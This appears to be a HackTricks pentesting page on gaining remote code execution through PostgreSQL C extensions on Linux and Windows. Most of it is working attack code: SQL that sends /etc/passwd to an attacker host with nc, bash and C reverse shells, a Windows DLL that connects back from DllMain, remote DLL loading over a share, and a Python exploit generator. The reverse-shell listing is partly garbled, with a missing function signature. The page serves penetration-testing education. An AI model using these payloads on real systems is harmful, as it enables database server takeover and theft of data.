# RCE with PostgreSQL Extensions

{#include ../../../../../../../home/runner/work/HackTricks-Feed/HackTricks-Feed/src/banners/hacktricks-training.md}

## PostgreSQL Extensions

PostgreSQL has been developed with extensibility as a core feature, allowing it to seamlessly integrate extensions as if they were built-in functionalities. These extensions, essentially libraries written in C, enrich the database with additional functions, operators, or types.

From version 8.1 onwards, a specific requirement is imposed on the extension libraries: they must be compiled with a special header. Without this, PostgreSQL will not execute them, ensuring only compatible and potentially secure extensions are used.

Also, keep in mind that **if you don't know how to** [**upload files to the victim abusing PostgreSQL you should read this post.**](big-binary-files-upload-postgresql.md)

### RCE in Linux

**For more information check: [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)**

The execution of system commands from PostgreSQL 8.1 and earlier versions is a process that has been clearly documented and is straightforward. It's possible to use this: [Metasploit module](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload).

```sql
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');

# You can also create functions to open and write files
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
```

<details>

<summary>Write binary file from base64</summary>

To write a binary into a file in postgres you might need to use base64, this will be helpful for that matter:

```sql
CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
    $$
    DECLARE
        fh int;
        s int;
        w bytea;
        i int;
    BEGIN
        SELECT open(textout(file)::cstring, 522, 448) INTO fh;

        IF fh <= 2 THEN
            RETURN 1;
        END IF;

        SELECT decode(s, 'base64') INTO w;

        i := 0;
        LOOP
            EXIT WHEN i >= octet_length(w);

            SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;

            IF rs < 0 THEN
                RETURN 2;
            END IF;

            i := i + 1;
        END LOOP;

        SELECT close(fh) INTO rs;

        RETURN 0;

    END;
    $$ LANGUAGE 'plpgsql';
```

</details>

However, when attempted on greater versions **the following error was shown**:

```c
ERROR:  incompatible library “/lib/x86_64-linux-gnu/libc.so.6”: missing magic block
HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
```

This error is explained in the [PostgreSQL documentation](https://www.postgresql.org/docs/current/static/xfunc-c.html):

> To ensure that a dynamically loaded object file is not loaded into an incompatible server, PostgreSQL checks that the file contains a “magic block” with the appropriate contents. This allows the server to detect obvious incompatibilities, such as code compiled for a different major version of PostgreSQL. A magic block is required as of PostgreSQL 8.2. To include a magic block, write this in one (and only one) of the module source files, after having included the header fmgr.h:
>
> `#ifdef PG_MODULE_MAGIC`\
> `PG_MODULE_MAGIC;`\
> `#endif`

Since PostgreSQL version 8.2, the process for an attacker to exploit the system has been made more challenging. The attacker is required to either utilize a library that is already present on the system or to upload a custom library. This custom library must be compiled against the compatible major version of PostgreSQL and must include a specific "magic block". This measure significantly increases the difficulty of exploiting PostgreSQL systems, as it necessitates a deeper understanding of the system's architecture and version compatibility.

#### Compile the library

Get the PsotgreSQL version with:

```sql
SELECT version();
PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18) 6.3.0 20170516, 64-bit
```

For compatibility, it is essential that the major versions align. Therefore, compiling a library with any version within the 9.6.x series should ensure successful integration.

To install that version in your system:

```bash
apt install postgresql postgresql-server-dev-9.6
```

And compile the library:

```c
//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
    char* command = PG_GETARG_CSTRING(0);
    PG_RETURN_INT32(system(command));
}
```

Then upload the compiled library and execute commands with:

```bash
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
#Notice the double single quotes are needed to scape the qoutes
```

You can find this **library precompiled** to several different PostgreSQL versions and even can **automate this process** (if you have PostgreSQL access) with:

### RCE in Windows

The following DLL takes as input the **name of the binary** and the **number** of **times** you want to execute it and executes it:

```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
	/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

	/* retrieve the second argument that is passed to the function (an integer)
	that will serve as our counter limit*/

	int instances = PG_GETARG_INT32(1);

	for (int c = 0; c < instances; c++) {
		/*launch the process passed in the first parameter*/
		ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
	}
	PG_RETURN_VOID();
}
```

You can find the DLL compiled in this zip:

{{#file}}
pgsql_exec.zip
{{#endfile}}

You can indicate to this DLL **which binary to execute** and the number of time to execute it, in this example it will execute `calc.exe` 2 times:

```bash
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
```

In [**here** ](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html)you can find this reverse-shell:

```c
#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

                    _In_ DWORD fdwReason,
                    _In_ LPVOID lpvReserved)
{
    WSADATA wsaData;
    SOCKET wsock;
    struct sockaddr_in server;
    char ip_addr[16];
    STARTUPINFOA startupinfo;
    PROCESS_INFORMATION processinfo;

    char *program = "cmd.exe";
    const char *ip = PG_REVSHELL_CALLHOME_SERVER;
    u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    wsock = WSASocket(AF_INET, SOCK_STREAM,
                      IPPROTO_TCP, NULL, 0, 0);

    struct hostent *host;
    host = gethostbyname(ip);
    strcpy_s(ip_addr, sizeof(ip_addr),
             inet_ntoa(*((struct in_addr *)host->h_addr)));

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
              NULL, NULL, NULL, NULL);

    memset(&startupinfo, 0, sizeof(startupinfo));
    startupinfo.cb = sizeof(startupinfo);
    startupinfo.dwFlags = STARTF_USESTDHANDLES;
    startupinfo.hStdInput = startupinfo.hStdOutput =
                            startupinfo.hStdError = (HANDLE)wsock;

    CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
                  NULL, NULL, &startupinfo, &processinfo);

    return TRUE;
}

#pragma warning(pop) /* re-enable 4996 */

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);

PG_FUNCTION_INFO_V1(add_one);

Datum dummy_function(PG_FUNCTION_ARGS)
{
    int32 arg = PG_GETARG_INT32(0);

    PG_RETURN_INT32(arg + 1);
}
```

Note how in this case the **malicious code is inside the DllMain function**. This means that in this case it isn't necessary to execute the loaded function in postgresql, just **loading the DLL** will **execute** the reverse shell:

```c
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
```

The [PolyUDF project](https://github.com/rop-la/PolyUDF) is also a good starting point with the full MS Visual Studio project and a ready to use library (including: _command eval_, _exec_ and _cleanup_) with multiversion support.

### RCE in newest Prostgres versions

In the **latest versions** of PostgreSQL, restrictions have been imposed where the `superuser` is **prohibited** from **loading** shared library files except from specific directories, such as `C:\Program Files\PostgreSQL\11\lib` on Windows or `/var/lib/postgresql/11/lib` on \*nix systems. These directories are **secured** against write operations by either the NETWORK_SERVICE or postgres accounts.

Despite these restrictions, it's possible for an authenticated database `superuser` to **write binary files** to the filesystem using "large objects." This capability extends to writing within the `C:\Program Files\PostgreSQL\11\data` directory, which is essential for database operations like updating or creating tables.

A significant vulnerability arises from the `CREATE FUNCTION` command, which **permits directory traversal** into the data directory. Consequently, an authenticated attacker could **exploit this traversal** to write a shared library file into the data directory and then **load it**. This exploit enables the attacker to execute arbitrary code, achieving native code execution on the system.

#### Attack flow

First of all you need to **use large objects to upload the dll**. You can see how to do that here:

{{#ref}}
big-binary-files-upload-postgresql.md
{{#endref}}

Once you have uploaded the extension (with the name of poc.dll for this example) to the data directory you can load it with:

```c
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```

_Note that you don't need to append the `.dll` extension as the create function will add it._

For more information **read the**[ **original publication here**](https://srcin.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)**.**\
In that publication **this was the** [**code use to generate the postgres extension**](https://github.com/sourcein/tools/blob/master/pgpwn.c) (_to learn how to compile a postgres extension read any of the previous versions_).\
In the same page this **exploit to automate** this technique was given:

```python
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
    print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
    print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
    d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
    start = i * 2048
    end   = (i+1) * 2048
    if i == 0:
        sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
    else:
        sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
    end   = (i+1) * 2048
    sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
    sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```
